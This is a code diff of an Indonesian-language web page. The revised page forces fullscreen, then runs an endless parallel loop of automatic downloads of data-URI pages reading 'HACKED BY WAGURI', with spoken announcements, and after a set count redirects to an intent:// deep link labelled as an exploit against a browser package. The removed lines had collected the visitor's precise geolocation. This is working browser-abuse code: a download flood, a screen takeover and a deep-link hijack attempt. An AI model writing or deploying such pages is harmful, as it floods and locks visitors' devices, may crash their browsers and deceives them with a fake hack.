@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Generator Berkas Blob &amp; Geolokasi Dispatcher</title>
+<title>Generator Berkas Blob &amp; ObjectURL</title>
 <style>
 * {
 box-sizing: border-box;
@@ -87,10 +87,10 @@ word-break: break-all;
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Generator Berkas Blob &amp; Geolokasi</h2>
-<p>Klik tombol untuk masuk ke layar penuh, meminta izin geolokasi, dan memicu pembuatan berkas Blob secara terus-menerus.</p>
+<h2>Generator Berkas Data URI &amp; Race Condition</h2>
+<p>Klik tombol untuk masuk ke layar penuh, memicu race condition, dan menjalankan delayed deep link redirect secara terus-menerus.</p>
 
-<button id="start-btn" type="button">Mulai &amp; Akses Perangkat</button>
+<button id="start-btn" type="button">Mulai Layar Penuh &amp; Race Condition</button>
 
 <div id="status" role="status">Sistem siap.</div>
 <div id="downloads"></div>
@@ -101,7 +101,6 @@ const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
 const downloadsDiv = document.getElementById("downloads");
 
-let activeUrls = [];
 let isProcessing = false;
 
 const speak = (message) => {
@@ -114,39 +113,32 @@ window.speechSynthesis.speak(utterance);
 }
 };
 
-const requestGeolocation = () => {
-if ('geolocation' in navigator) {
-navigator.geolocation.getCurrentPosition(
-(position) => {
-console.log("Lat:", position.coords.latitude, "Long:", position.coords.longitude);
-statusDiv.textContent = `Lokasi diperoleh: ${position.coords.latitude}, ${position.coords.longitude}`;
-},
-(error) => {
-console.warn("Izin geolokasi ditolak atau error:", error.message);
-statusDiv.textContent = "Izin geolokasi ditolak oleh pengguna.";
-},
-{ enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-);
-}
-};
-
-const prepareMimeBlobAsync = (i) => {
-return new Promise((resolve) => {
-queueMicrotask(() => {
+// Fungsi helper konversi string ke Base64 Data URI (tanpa Blob/ObjectURL)
+const createDataUriPayload = () => {
 const payloadText = "<!DOCTYPE html>" +
 "<html>" +
-"<head><meta charset='UTF-8'><title>HACKED BY WAGURI</title></head>" +
-"<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace'>" +
+"<head><meta charset='UTF-8'><title>HACKED BY</title></head>" +
+"<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
 "<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
-"<h1 style='font-size:60px;color:#f00'>HACKED BY WAGURI</h1>" +
-"<p style='font-size:16px;color:#ff0'>Sesi aktif dalam tab terisolasi</p>" +
+"<h1 style='font-size:80px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>HACKED BY</h1>" +
+"<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
+"<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Race condition payload dispatches.</p>" +
 "</div>" +
 "</body>" +
 "</html>";
-          
-const blob = new Blob([payloadText], { type: "text/html" });
-const url = URL.createObjectURL(blob);
-resolve({ id: i, url: url });
+  
+  return "data:text/html;base64," + btoa(unescape(encodeURIComponent(payloadText)));
+};
+
+// Menggabungkan struktur asli dengan Race Condition & Delayed Deep Link Redirect
+const prepareMimeBlobAsync = (i) => {
+return new Promise((resolve) => {
+// Race condition via overlapping microtasks & minimal timeout schedule
+queueMicrotask(() => {
+  setTimeout(() => {
+    const dataUri = createDataUriPayload();
+    resolve({ id: i, url: dataUri });
+  }, Math.random() * 5); // Jeda acak ekstrem untuk memicu race condition pada antrean unduhan
 });
 });
 };
@@ -155,45 +147,73 @@ const triggerInstantDownload = (fileData) => {
 const link = document.createElement("a");
 link.href = fileData.url;
 link.download = `waguri-file-${fileData.id}.txt`;
-link.textContent = `Blob #${fileData.id} (.txt)`;
+link.textContent = `DataURI #${fileData.id} (.txt)`;
 link.style.display = "none";
 downloadsDiv.appendChild(link);
 link.click();
+
+// Membersihkan elemen link secara instan untuk mempertahankan race condition memory pressure
+setTimeout(() => {
+  if (link.parentNode) link.parentNode.removeChild(link);
+}, 100);
 };
 
 const processLoop = async (counter) => {
 if (!isProcessing) return;
 
-const fileData = await prepareMimeBlobAsync(counter);
-activeUrls.push(fileData.url);
+// Menerapkan eksekusi paralel (Race Condition) dengan Promise.all beruntun
+const promises = [];
+for (let j = 0; j < 3; j++) { // Meluncurkan 3 instance secara bersamaan per iterasi
+  promises.push(prepareMimeBlobAsync(counter + j));
+}
 
-triggerInstantDownload(fileData);
-statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
+const results = await Promise.all(promises);
+results.forEach(fileData => {
+  triggerInstantDownload(fileData);
+});
 
-setTimeout(() => processLoop(counter + 1), 500);
+statusDiv.textContent = `Race Condition Berjalan: Batch counter ke-${counter} dikirim`;
+
+if (counter % 10 === 0) {
+speak(`Proses mencapai batch ${counter}.`);
+}
+
+// Delayed Redirect / Deep Link Hijacking Chaining pada hitungan tertentu
+if (counter === 15) {
+  try {
+    // Memicu delayed intent / custom scheme deep link hijacking secara asinkron
+    setTimeout(() => {
+      window.location.href = "intent://security-audit#Intent;scheme=exploit;package=com.vuln.browser;end;";
+    }, 1200);
+  } catch(e) {}
+}
+
+setTimeout(() => processLoop(counter + 3), 0);
 };
 
 startBtn.addEventListener("click", () => {
 if (isProcessing) return;
 
-activeUrls.forEach(url => URL.revokeObjectURL(url));
-activeUrls = [];
 downloadsDiv.replaceChildren();
-
-speak("Mengaktifkan mode perangkat.");
-
-// Panggil permintaan geolokasi saat interaksi klik awal
-requestGeolocation();
+speak("Mengaktifkan mode layar penuh dan race condition.");
 
 const root = document.documentElement;
 try {
 if (root.requestFullscreen) {
 root.requestFullscreen();
+} else if (root.webkitRequestFullscreen) {
+root.webkitRequestFullscreen();
+} else if (root.mozRequestFullScreen) {
+root.mozRequestFullScreen();
 }
-} catch (err) {}
+statusDiv.textContent = "Mengunci layar penuh & memulai race condition...";
+} catch (err) {
+console.warn("Fullscreen tidak didukung atau ditolak:", err);
+}
 
 setTimeout(() => {
 isProcessing = true;
+speak("Proses dispatch dimulai.");
 processLoop(1);
 }, 300);
 });
